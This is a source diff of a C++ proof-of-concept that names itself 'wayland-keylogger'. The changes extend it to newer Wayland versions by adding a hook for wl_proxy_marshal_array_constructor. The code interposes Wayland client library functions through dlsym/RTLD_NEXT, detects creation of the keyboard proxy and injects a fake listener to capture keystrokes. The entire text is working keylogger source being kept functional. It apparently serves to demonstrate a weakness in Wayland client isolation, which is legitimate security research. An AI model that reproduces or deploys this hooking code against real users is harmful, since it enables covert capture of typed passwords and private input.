@@ -1,5 +1,5 @@
 /*
-Copyright (c) 2012-2013 Maarten Baert <maarten-baert@hotmail.com>
+Copyright (c) 2012-2014 Maarten Baert <maarten-baert@hotmail.com>
 
 Permission to use, copy, modify, and/or distribute this software for any purpose with or without fee is hereby granted, provided that the above copyright notice and this permission notice appear in all copies.
 
@@ -14,10 +14,12 @@ THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES WITH RE
 #include <wayland-client.h>
 
 struct wl_proxy* my_wl_proxy_create(struct wl_proxy *factory, const struct wl_interface *interface);
+struct wl_proxy* my_wl_proxy_marshal_array_constructor(struct wl_proxy *proxy, uint32_t opcode, union wl_argument *args, const struct wl_interface *interface);
 int my_wl_proxy_add_listener(struct wl_proxy *factory, void (**implementation)(void), void *data);
 
 void *(*g_real_dlsym)(void*, const char*) = NULL;
 void *(*g_real_dlvsym)(void*, const char*, const char*) = NULL;
+struct wl_proxy* (*g_real_wl_proxy_marshal_array_constructor)(struct wl_proxy*, uint32_t, union wl_argument*, const struct wl_interface*);
 struct wl_proxy* (*g_real_wl_proxy_create)(struct wl_proxy*, const struct wl_interface*);
 int (*g_real_wl_proxy_add_listener)(struct wl_proxy*, void (**)(void), void*);
 
@@ -29,6 +31,11 @@ void init_hooks() {
 		return;
 	
 	fprintf(stderr, "[wayland-keylogger] init_hooks begin.\n");
+	fprintf(stderr, "[wayland-keylogger] Note: This is only a proof-of-concept. It is not perfect.\n");
+	fprintf(stderr, "[wayland-keylogger] It depends on Wayland internals and will need an update\n");
+	fprintf(stderr, "[wayland-keylogger] whenever those internals change. The last Wayland/Weston\n");
+	fprintf(stderr, "[wayland-keylogger] version that has been tested with this program is 1.4.0.\n");
+	fprintf(stderr, "[wayland-keylogger] You are using version %s.\n", WAYLAND_VERSION);
 	
 	// part 1: get dlsym and dlvsym
 	eh_obj_t libdl;
@@ -49,16 +56,12 @@ void init_hooks() {
 	eh_destroy_obj(&libdl);
 	
 	// part 2: get everything else
-	g_real_wl_proxy_create = (struct wl_proxy* (*)(struct wl_proxy*, const struct wl_interface*)) g_real_dlsym(RTLD_NEXT, "wl_proxy_create");
-	if(g_real_wl_proxy_create == NULL) {
-		fprintf(stderr, "[wayland-keylogger] Can't get wl_proxy_create address!\n");
-		exit(-181818181);
-	}
-	g_real_wl_proxy_add_listener = (int (*)(struct wl_proxy*, void (**)(void), void*)) g_real_dlsym(RTLD_NEXT, "wl_proxy_add_listener");
-	if(g_real_wl_proxy_create == NULL) {
-		fprintf(stderr, "[wayland-keylogger] Can't get wl_proxy_add_listener address!\n");
-		exit(-181818181);
-	}
+	g_real_wl_proxy_create = (struct wl_proxy* (*)(struct wl_proxy*, const struct wl_interface*))
+		g_real_dlsym(RTLD_NEXT, "wl_proxy_create");
+	g_real_wl_proxy_marshal_array_constructor = (struct wl_proxy* (*)(struct wl_proxy*, uint32_t, union wl_argument*, const struct wl_interface*))
+		g_real_dlsym(RTLD_NEXT, "wl_proxy_marshal_array_constructor");
+	g_real_wl_proxy_add_listener = (int (*)(struct wl_proxy*, void (**)(void), void*))
+		g_real_dlsym(RTLD_NEXT, "wl_proxy_add_listener");
 	
 	fprintf(stderr, "[wayland-keylogger] init_hooks end.\n");
 	
@@ -71,8 +74,9 @@ struct Hook {
 	void* address;
 };
 Hook hook_table[] = {
-	{"wl_proxy_create", (void*) &g_real_wl_proxy_create},
-	{"wl_proxy_add_listener", (void*) &g_real_wl_proxy_add_listener},
+	{"wl_proxy_create", (void*) &my_wl_proxy_create},
+	{"wl_proxy_marshal_array_constructor", (void*) &my_wl_proxy_marshal_array_constructor},
+	{"wl_proxy_add_listener", (void*) &my_wl_proxy_add_listener},
 };
 
 struct KeyLoggerData {
@@ -116,7 +120,9 @@ wl_keyboard_listener my_keyboard_listener = {
 
 struct wl_proxy* g_keyboard_to_log = NULL;
 
+// for older Wayland versions
 struct wl_proxy* my_wl_proxy_create(struct wl_proxy *factory, const struct wl_interface *interface) {
+	//fprintf(stderr, "[wayland-keylogger] my_wl_proxy_create(factory=%p, interface=%p)\n", factory, interface);
 	struct wl_proxy* id = g_real_wl_proxy_create(factory, interface);
 	if(interface == &wl_keyboard_interface) {
 		fprintf(stderr, "[wayland-keylogger] Got keyboard id!\n");
@@ -125,7 +131,19 @@ struct wl_proxy* my_wl_proxy_create(struct wl_proxy *factory, const struct wl_in
 	return id;
 }
 
+// for newer wayland versions
+struct wl_proxy* my_wl_proxy_marshal_array_constructor(struct wl_proxy *proxy, uint32_t opcode, union wl_argument *args, const struct wl_interface *interface) {
+	//fprintf(stderr, "[wayland-keylogger] my_wl_proxy_marshal_array_constructor(proxy=%p, opcode=%u, args=%p, interface=%p)\n", proxy, opcode, args, interface);
+	struct wl_proxy* id = g_real_wl_proxy_marshal_array_constructor(proxy, opcode, args, interface);
+	if(interface == &wl_keyboard_interface) {
+		fprintf(stderr, "[wayland-keylogger] Got keyboard id!\n");
+		g_keyboard_to_log = id;
+	}
+	return id;
+}
+
 int my_wl_proxy_add_listener(struct wl_proxy *factory, void (**implementation)(void), void *data) {
+	//fprintf(stderr, "[wayland-keylogger] my_wl_proxy_add_listener(factory=%p, implementation=%p, data=%p)\n", factory, implementation, data);
 	if(g_keyboard_to_log != NULL && factory == g_keyboard_to_log) {
 		fprintf(stderr, "[wayland-keylogger] Adding fake listener!\n");
 		g_keyboard_to_log = NULL;
@@ -143,6 +161,11 @@ int my_wl_proxy_add_listener(struct wl_proxy *factory, void (**implementation)(v
 extern "C" struct wl_proxy* wl_proxy_create(struct wl_proxy *factory, const struct wl_interface *interface) {
 	init_hooks();
 	return my_wl_proxy_create(factory, interface);
+}
+
+extern "C" struct wl_proxy* wl_proxy_marshal_array_constructor(struct wl_proxy *proxy, uint32_t opcode, union wl_argument *args, const struct wl_interface *interface) {
+	init_hooks();
+	return my_wl_proxy_marshal_array_constructor(proxy, opcode, args, interface);
 }
 
 extern "C" int wl_proxy_add_listener(struct wl_proxy *factory, void (**implementation)(void), void *data) {
